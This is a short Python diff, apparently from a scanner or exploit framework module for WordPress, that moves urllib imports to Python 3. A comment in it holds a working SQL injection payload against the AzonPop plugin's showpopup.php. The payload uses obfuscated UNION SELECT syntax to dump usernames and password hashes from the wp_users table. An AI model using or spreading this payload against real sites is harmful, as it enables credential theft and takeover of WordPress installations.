@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 import re
-import urllib
+import urllib.request, urllib.parse, urllib.error
 # paylaod=wp-content/plugins/AzonPop/files/view/showpopup.php?popid=null/*!00000union*/%20select%201,2,/*!00000gRoup_ConCat(unhex(hex(user_login)),0x3c2f62723e,unhex(hex(user_pass)))*/,4,5%20/*!00000from*/%20wp_users
 def assign(service, arg):
     if service == "wordpress":
